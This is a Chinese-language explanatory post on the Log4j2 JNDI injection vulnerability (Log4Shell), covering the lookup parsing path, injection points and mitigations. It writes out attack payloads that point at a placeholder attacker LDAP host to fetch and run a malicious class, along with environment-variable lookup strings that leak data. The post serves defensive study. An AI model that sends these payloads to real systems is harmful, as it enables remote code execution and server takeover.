---
title: Log4j各版本漏洞
date: 2026-01-13
updated: 2026-01-13
tags:
  - 服务组件框架漏洞
  - Java安全
categories:
  - 安全相关
description: Log4j各版本漏洞
published: true
---
> 历史漏洞 https://avd.aliyun.com/search?q=Log4j

Apache Log4j2，Java 最常用的日志组件，因为支持 JNDI 注入，导致只要打日志就能被远程代码执行。

把恶意代码写进用户名、密码、URL、UA、Cookie 等只要服务器用 Log4j2 打日志，则会执行

Log4j2 在记录日志时，会自动解析 `${}` 表达式。攻击者构造：

```
${jndi:ldap://攻击机IP/恶意类}
```

服务器日志一记录 → 自动触发：

- 解析 `${}`
- 发起 JNDI 请求
- 连接攻击机 LDAP/RMI 服务
- 下载并执行恶意类 → 服务器沦陷

## 解析过程

`org.apache.logging.log4j.core.pattern.MessagePatternConverter` 的 `format()` 方法（表达式内容替换）

日志中包含 `${}` 就会将表达式的内容替换为表达式解析后的内容，从而导致攻击者构造符合要求的表达式供系统执行

Log4j - java

```
${java:version} getSystemProperty("java.version")
${java:runtime} getRuntime()
${java:vm} getVirtualMachine()
${java:os} getOperatingSystem()
${java:hw} getHardware()
${java:locale} getLocale()
```

Linux - env

```
${env:CLASSPATH}
${env:HOME}
${env:JAVA_HOME}
${env:LANG}
${env:LC_TERMINAL}
...
```

`apache.logging.log4j.core.lookup.StrSubstitutor`（提取字符串，并通过 lookup 进行内容替换）

日志在打印时当遇到 `${}` 后，Interpolator 类以 `:` 号作为分割，将表达式内容分割成两部分：

- 前面部分作为 prefix
- 后面部分作为 key
- 然后通过 prefix 去找对应的 lookup，通过对应的 lookup 实例调用 lookup 方法，最后将 key 作为参数带入执行。

由于 Log4j2 支持很多协议，例如通过 ldap 查找变量，通过 docker 查找变量，rmi 等等。

ldap 来构造 payload：`${jndi:ldap://ip/port/exp}`

最终效果通过 jndi 注入，借助 ldap 服务来下载执行恶意 payload，从而执行命令

## 漏洞点

漏洞触发点：用户名、邮箱、手机号、HTTP 头、接口参数、订单号等

与普通 JNDI（直接加载远程类） 注入不同，Log4j2 限制：只允许加载 Reference 类型。

所以必须构造 Reference，指定远程 ObjectFactory，在 `getObjectInstance()` 中执行代码

漏洞触发 `logger.error` `logger.info`

底层触发函数：

- `StrSubstitutor.substitute()`
- `resolveVariable()`
- `JndiLookup.lookup()` 最终触发

实战中未知开发者会对哪个参数进行日志处理，所以在不确定特征和参数的情况下只能盲打。

防御：

- 升级至 2.17.0+
- 临时措施
	- 设置 JVM 参数 `-Dlog4j2.formatMsgNoLookups=true`
	- jdk > 11.0.1、8u191、7u201、6u211
	- 删除 JndiLookup 类
- 限制外连网络、启用 WAF 规则拦截恶意日志请求
